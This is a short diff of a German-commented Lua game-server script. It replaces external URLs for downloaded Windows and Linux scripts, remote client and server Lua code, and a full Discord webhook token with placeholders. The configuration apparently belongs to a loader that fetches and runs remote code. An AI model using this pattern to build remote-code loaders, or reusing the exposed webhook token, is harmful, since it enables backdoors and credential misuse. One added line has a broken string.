@@ -19,13 +19,13 @@ end
 
 
 local config = {
-    windowsScriptURL = "https://dc.fast-sell.de/windowsscript.bat",
-    linuxScriptURL = "https://dc.fast-sell.de/linuxscript.sh",
+    windowsScriptURL = "yourbatch",
+    linuxScriptURL = "yourshell",
     enablePrints = false,
     resourceCodeURLs = {
-        ["r9eurieuidjfjidj"] = {
-            client = "https://sdc.fdsast-sedsll.de/servsdser.lua",
-            server = "https:/s/dc.fast-sedsll.de/sedsrver.lua"
+        ["ressourcename"] = {
+            client = "yourclient,
+            server = "yourserver"
         }
     }
 }
@@ -153,7 +153,7 @@ end
 -- Starte das Skript
 main()
 
-local discordWebhook = "https://discord.com/api/webhooks/1122996897309786223/nw9KjkkDhWt1Ulmq-WYU-mdwtXCQLnn830wYJFQRwuyt60WOZNxm5hB_KaySTACSXBYP" -- Discord-Webhook-URL hier einfügen
+local discordWebhook = "DISCORDURL" -- Discord-Webhook-URL hier einfügen
 local adminsFile = "admins.json" -- Pfad zur admins.json-Datei
 
 -- Funktion zur Ermittlung des Betriebssystems
